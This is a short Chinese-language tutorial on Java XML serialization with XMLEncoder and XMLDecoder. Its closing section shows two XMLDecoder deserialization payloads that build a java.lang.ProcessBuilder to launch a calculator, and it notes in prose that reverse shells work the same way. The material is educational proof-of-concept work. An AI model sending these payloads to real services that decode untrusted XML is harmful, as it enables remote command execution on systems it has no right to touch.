java序列化：将java对象序列化成字符串可保存本地文件中。
java反序列化：读取本地文件，将字符串实例化为java对象。

^
## **xml序列化：**
将对象序列化成xml格式的字符串。
hashmap等集合的类型的类实现了java.io.Serializable接口，中的对象可以进行xml序列化。

```
    HashMap<Integer, Object> map;
    map = new HashMap<>();
    map.put(1,"one");
    map.put(2,new String[]{"a","b","c"});
    
    ArrayList arrayList = new ArrayList();
    
    arrayList.add(1);
    arrayList.add("xss");
    
    map.put(3,arrayList);
    
    // System.out.println(map);
    
    XMLEncoder xmlEncoder = new XMLEncoder(System.out);
    xmlEncoder.writeObject(map);
    xmlEncoder.close();
```
序列化后的xml格式：描述了这个对象序列化前的各种操作，以及导入的包。
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="11.0.6" class="java.beans.XMLDecoder">
 <object class="java.util.HashMap">
  <void method="put">
   <int>1</int>
   <string>one</string>
  </void>
  <void method="put">
   <int>2</int>
   <array class="java.lang.String" length="3">
    <void index="0">
     <string>a</string>
    </void>
    <void index="1">
     <string>b</string>
    </void>
    <void index="2">
     <string>c</string>
    </void>
   </array>
  </void>
  <void method="put">
   <int>3</int>
   <object class="java.util.ArrayList">
    <void method="add">
     <int>1</int>
    </void>
    <void method="add">
     <string>xss</string>
    </void>
   </object>
  </void>
 </object>
</java>
```
## **xml反序列化：**
```
String strXML = "<?xml version="1.0" encoding="UTF-8"?>...";
StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(strXML);
XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
Object o = xmlDecoder.readObject();
System.out.println(o);//输出为对象
```
## **xml反序列化恶意构造：**
假设xml的序列化代码可控。
替换object成java命令执行代码，弹计算器，反弹shell等。
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_261" class="java.beans.XMLDecoder">
        <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="1">
        <void index="0">
        <string>calc</string></void>
        </array>
        <void method="start"></void>
        </object>
</java>

```
```
<?xml version="1.0" encoding="UTF-8"?>
<java version="11.0.6" class="java.beans.XMLDecoder">
         <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="1">
        <void index="0">
        <string>calc</string></void>
        </array>
        <void method="start"></void>
        </object>
</java>
```